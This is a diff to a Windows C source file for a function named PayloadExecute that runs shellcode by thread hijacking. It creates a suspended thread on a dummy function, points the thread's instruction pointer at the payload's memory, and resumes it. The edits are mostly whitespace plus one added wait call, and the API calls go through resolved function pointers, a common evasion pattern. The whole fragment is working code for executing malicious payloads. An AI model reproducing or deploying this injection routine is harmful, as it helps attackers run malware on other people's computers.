@@ -4,7 +4,7 @@
 #include <Windows.h>
 
 DWORD WINAPI DummyFunction(LPVOID lpParam) {
-	return 0;
+    return 0;
 }
 
 BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {
@@ -12,8 +12,8 @@ BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sP
 	PVOID    pAddress         = NULL;
 	DWORD    dwOldProtection  = NULL;
 	CONTEXT  ThreadCtx        = { 
-		.ContextFlags = CONTEXT_CONTROL 
-	};
+			.ContextFlags = CONTEXT_CONTROL 
+		};
 
     HANDLE hThread = pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
 	if (hThread == NULL) {
@@ -43,8 +43,8 @@ BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sP
 		return FALSE;
 	}
 
-	// Updating the next instruction pointer to be equal to the payload's address 
-	ThreadCtx.Rip = (DWORD64)pAddress;
+		// Updating the next instruction pointer to be equal to the payload's address 
+		ThreadCtx.Rip = (DWORD64)pAddress;
 
 	// Updating the new thread context
 	if (!pSetThreadContext(hThread, &ThreadCtx)) {
@@ -58,5 +58,6 @@ BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sP
         return FALSE;
     }
 
+	WaitForSingleObject(hThread, INFINITE);
 	return TRUE;
 }
